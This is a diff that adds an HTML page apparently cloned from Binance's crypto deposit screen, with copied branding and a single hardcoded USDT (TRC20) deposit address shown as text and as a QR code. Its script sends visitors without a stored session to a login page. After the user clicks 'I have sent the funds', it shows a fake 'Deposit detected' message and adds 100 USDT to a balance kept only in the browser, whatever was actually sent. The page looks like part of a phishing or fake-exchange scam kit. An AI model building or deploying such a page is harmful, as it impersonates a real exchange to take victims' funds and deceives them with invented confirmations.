@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#181A20">
+<title>Deposit Crypto | Binance</title>
+<style>
+@font-face{font-family:BinanceNova;font-display:swap;src:url("https://bin.bnbstatic.com/static/fonts/bn/v2/BinanceNova-Regular.woff2") format("woff2");font-weight:400}
+@font-face{font-family:BinanceNova;font-display:swap;src:url("https://bin.bnbstatic.com/static/fonts/bn/v2/BinanceNova-Medium.woff2") format("woff2");font-weight:500}
+@font-face{font-family:BinanceNova;font-display:swap;src:url("https://bin.bnbstatic.com/static/fonts/bn/v2/BinanceNova-SemiBold.woff2") format("woff2");font-weight:600 800}
+:root{--bg:#181A20;--bg2:#0B0E11;--card:#202630;--input:#29313D;--line:#333B47;--inputline:#474D57;--txt:#EAECEF;--txt2:#929AA5;--txt3:#707A8A;--yellow:#F0B90B;--btn:#FCD535;--ontxt:#202630;--green:#2EBD85;--red:#F6465D}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{font-family:BinanceNova,Arial,sans-serif;background:var(--bg);color:var(--txt);font-size:14px;line-height:1.5;min-height:100vh}
+a{text-decoration:none;color:inherit;cursor:pointer}
+button{font-family:inherit;cursor:pointer}
+header{height:64px;display:flex;align-items:center;gap:24px;padding:0 24px;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--bg);z-index:5}
+.logo{display:flex;align-items:center}
+header nav{display:flex;gap:22px;font-size:14px}
+header nav a{color:var(--txt)}
+header nav a:hover{color:var(--yellow)}
+.hright{margin-left:auto;display:flex;align-items:center;gap:14px}
+.ico{background:none;border:0;color:var(--txt3);display:grid;place-items:center;width:24px;height:24px;padding:0}
+.ico:hover,.ico.on{color:var(--yellow)}
+.av{width:28px;height:28px;border-radius:50%;background:var(--input);color:var(--txt);display:grid;place-items:center;font-size:12px;font-weight:600;text-transform:uppercase}
+main{max-width:1200px;margin:0 auto;padding:24px}
+h1{font-size:20px;font-weight:600;margin-bottom:16px}
+.tabs{display:flex;gap:24px;border-bottom:1px solid var(--line);margin-bottom:20px}
+.tabs span{font-size:14px;padding-bottom:10px;color:var(--txt2);cursor:pointer}
+.tabs span.on{color:var(--txt);font-weight:500;box-shadow:inset 0 -2px 0 var(--yellow)}
+.grid{display:grid;grid-template-columns:1fr 340px;gap:20px;align-items:start}
+.card{background:var(--card);border-radius:8px;padding:20px}
+.selrow{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}
+.sel{text-align:left;border:1px solid var(--inputline);border-radius:4px;padding:8px 12px;background:transparent;color:var(--txt)}
+.sel small{display:block;font-size:12px;color:var(--txt2);margin-bottom:2px}
+.sel b{display:flex;align-items:center;gap:8px;font-size:15px;font-weight:500}
+.sel .cv{margin-left:auto;color:var(--txt2)}
+.warn{background:rgba(240,185,11,.1);border-radius:4px;padding:10px 12px;font-size:13px;color:var(--yellow);line-height:1.6;margin-bottom:16px}
+.lbl{font-size:13px;color:var(--txt2);margin-bottom:6px}
+.addrbox{display:flex;align-items:center;gap:10px;border:1px solid var(--inputline);border-radius:4px;padding:10px 12px;background:var(--bg2)}
+.addrbox code{flex:1;font-family:ui-monospace,monospace;font-size:13px;word-break:break-all;color:var(--txt)}
+.cp{background:none;border:0;color:var(--yellow);width:22px;height:22px;display:grid;place-items:center;flex:0 0 auto;padding:0}
+.qrwrap{display:flex;gap:16px;margin-top:14px;align-items:flex-start}
+.qr{background:#fff;padding:8px;border-radius:6px;width:150px;height:150px;display:block}
+.rows{margin-top:16px;border-top:1px solid var(--line);padding-top:12px}
+.row{display:flex;justify-content:space-between;font-size:13px;padding:6px 0}
+.row span:first-child{color:var(--txt2)}
+.btn{width:100%;height:44px;border:0;border-radius:4px;background:var(--btn);color:var(--ontxt);font-size:15px;font-weight:500;margin-top:16px}
+.btn:active{background:#E8C41F}
+.btn2{width:100%;height:44px;border:1px solid var(--inputline);border-radius:4px;background:transparent;color:var(--txt);font-size:15px;margin-top:10px}
+.ok{display:none;background:rgba(46,189,133,.1);color:var(--green);border-radius:4px;padding:10px 12px;font-size:13px;margin-top:14px}
+.ok.on{display:block}
+.tips h3{font-size:15px;font-weight:600;margin-bottom:12px}
+.tips li{list-style:none;font-size:13px;color:var(--txt2);line-height:1.7;padding-left:14px;position:relative;margin-bottom:8px}
+.tips li:before{content:"";position:absolute;left:0;top:9px;width:4px;height:4px;border-radius:50%;background:var(--txt3)}
+.toast{position:fixed;left:50%;bottom:32px;transform:translateX(-50%);background:#4F5867;color:#fff;font-size:13px;padding:10px 16px;border-radius:4px;opacity:0;transition:.2s;pointer-events:none;z-index:20}
+.toast.on{opacity:1}
+@media(max-width:860px){
+ header nav{display:none}
+ main{padding:16px}
+ .grid{grid-template-columns:1fr}
+ .qr{width:130px;height:130px}
+}
+</style></head><body>
+<header>
+<a class="logo" href="index.html"><svg height="24" width="120" viewBox="0 0 120 24" xmlns="http://www.w3.org/2000/svg"><path fill="#F0B90B" d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"></path></svg></a>
+<nav><a>Buy Crypto</a><a>Markets</a><a>Trade</a><a>Futures</a><a>Earn</a></nav>
+<div class="hright">
+<button class="ico" aria-label="Search"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M10 18a8 8 0 1 1 5.3-2l5.2 5.2-1.4 1.4-5.2-5.2A8 8 0 0 1 10 18zm0-2a6 6 0 1 0 0-12 6 6 0 0 0 0 12z"></path></svg></button>
+<button class="ico on" aria-label="Wallet"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M3 5h15a3 3 0 0 1 3 3v9a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V5zm2 0v2h13a1 1 0 0 1 1 1v2H5V5zm12 8a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3z"></path></svg></button>
+<div class="av" id="av">U</div>
+</div>
+</header>
+<main>
+<h1>Deposit Crypto</h1>
+<div class="tabs"><span class="on">Deposit Crypto</span><span>Deposit Cash</span></div>
+<div class="grid">
+<div class="card">
+ <div class="selrow">
+  <button class="sel"><small>Coin</small><b><svg width="18" height="18" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#26A17B"></circle><path fill="#fff" d="M17.9 14.1v-2h5.2V9H8.9v3.1h5.2v2c-4.2.2-7.4 1-7.4 2s3.2 1.8 7.4 2v7.1h3.8v-7.1c4.2-.2 7.4-1 7.4-2s-3.2-1.8-7.4-2zm0 3.4v-.9c-.6.1-1.2.1-1.9.1s-1.3 0-1.9-.1v.9c-3.5-.3-6.1-.9-6.1-1.5s2.6-1.2 6.1-1.5v.9c.6.1 1.2.1 1.9.1s1.3 0 1.9-.1v-.9c3.5.3 6.1.9 6.1 1.5s-2.6 1.2-6.1 1.5z"></path></svg>USDT<span class="cv"><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"></path></svg></span></b></button>
+  <button class="sel"><small>Network</small><b>Tron (TRC20)<span class="cv"><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"></path></svg></span></b></button>
+ </div>
+ <div class="warn">Send only USDT to this deposit address.<br>Ensure the network is <b>Tron (TRC20)</b>.</div>
+ <div class="lbl">Address</div>
+ <div class="addrbox"><code id="addr"></code><button class="cp" onclick="copyAddr()" aria-label="Copy address"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M16 1H4a2 2 0 0 0-2 2v14h2V3h12V1zm3 4H8a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2zm0 16H8V7h11v14z"></path></svg></button></div>
+ <div class="qrwrap"><img class="qr" id="qr" alt="Deposit address QR code"></div>
+ <div class="rows">
+  <div class="row"><span>Minimum deposit</span><span>10 USDT</span></div>
+  <div class="row"><span>Expected arrival</span><span>1 network confirmation</span></div>
+  <div class="row"><span>Network</span><span>Tron (TRC20)</span></div>
+ </div>
+ <button class="btn" onclick="copyAddr()">Copy Address</button>
+ <button class="btn2" onclick="sent()">I have sent the funds</button>
+ <div class="ok" id="ok">Deposit detected. Crediting to your account…</div>
+</div>
+<div class="card tips">
+ <h3>Deposit Tips</h3>
+ <ul>
+  <li>Send only USDT through the Tron (TRC20) network to this address.</li>
+  <li>Deposits sent through a different network cannot be recovered.</li>
+  <li>The minimum deposit amount is 10 USDT. Smaller amounts will not be credited.</li>
+  <li>Your deposit will be credited after 1 network confirmation, usually within 1 minute.</li>
+  <li>Do not deposit to this address if it is a contract address.</li>
+ </ul>
+</div>
+</div>
+</main>
+<div class="toast" id="toast">Address copied</div>
+<script>
+var ADDR="TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ";
+var me=localStorage.getItem("bncSess")||"";
+if(!me){location.href="login.html"}
+document.getElementById("av").textContent=(me[0]||"U");
+document.getElementById("addr").textContent=ADDR;
+document.getElementById("qr").src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data="+ADDR;
+function toast(m){var t=document.getElementById("toast");t.textContent=m;t.classList.add("on");setTimeout(function(){t.classList.remove("on")},1600)}
+function copyAddr(){navigator.clipboard.writeText(ADDR).then(function(){toast("Address copied")},function(){toast(ADDR)})}
+function sent(){var o=document.getElementById("ok");o.classList.add("on");
+setTimeout(function(){var s=JSON.parse(localStorage.getItem("u_"+me)||'{"bal":0,"h":{},"p":{}}');s.bal=(s.bal||0)+100;localStorage.setItem("u_"+me,JSON.stringify(s));
+o.textContent="100 USDT credited to your spot wallet";},6000)}
+</script>
+</body></html>
